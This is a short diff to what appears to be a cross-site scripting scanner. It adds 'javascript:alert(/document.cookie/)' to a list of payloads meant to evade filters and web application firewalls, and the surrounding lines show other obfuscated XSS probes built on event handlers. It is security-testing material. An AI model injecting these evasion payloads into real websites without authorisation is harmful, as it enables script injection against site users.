@@ -49,6 +49,7 @@ functions = (  # JavaScript functions to get a popup
 
 payloads = (  # Payloads for filter & WAF evasion
     '\'"</Script><Html Onmouseover=(confirm)()//',
+    'javascript:alert(/document.cookie/)',
     '<imG/sRc=l oNerrOr=(prompt)() x>',
     '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
     '<deTails open oNToggle=confi\u0072m()>',
